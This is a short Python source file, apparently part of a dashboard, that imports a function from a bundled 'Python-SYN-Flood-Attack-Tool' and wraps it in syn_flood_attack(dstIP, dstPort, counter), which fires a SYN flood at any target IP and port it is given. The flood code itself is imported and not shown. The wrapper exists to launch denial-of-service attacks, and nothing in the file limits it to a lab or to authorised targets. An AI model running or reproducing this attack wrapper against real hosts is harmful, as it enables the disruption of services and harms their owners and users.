import os
import sys


###############################SYN FLOOD ATTACK########################################
DashboardScriptDir = os.path.dirname(os.path.abspath(__file__))
PythonSynAttackDir = os.path.join(DashboardScriptDir, 'Python-SYN-Flood-Attack-Tool/')
sys.path.append(PythonSynAttackDir)

from py3_synflood_cmd import SYN_Flood


def syn_flood_attack(dstIP, dstPort, counter):
    try :
        SYN_Flood(dstIP, dstPort, counter)
        return 0
    except :
        return -1
